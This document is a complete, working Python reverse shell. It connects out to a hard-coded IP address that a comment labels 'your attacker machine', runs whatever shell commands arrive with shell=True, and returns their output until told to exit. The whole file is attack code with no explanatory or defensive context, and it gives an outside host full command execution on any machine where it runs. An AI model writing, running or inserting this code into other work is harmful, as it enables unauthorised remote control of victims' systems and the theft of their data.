import socket
import subprocess
import os

HOST = '102.212.236.28'  # IP address of your attacker machine
PORT = 12345      # Port on the attacker machine

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    while True:
        command = s.recv(4096).decode()
        if command.strip().lower() == "exit":
            break
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = output.communicate()
        result = stdout + stderr
        s.sendall(result)
    s.close()

if __name__ == "__main__":
    connect()
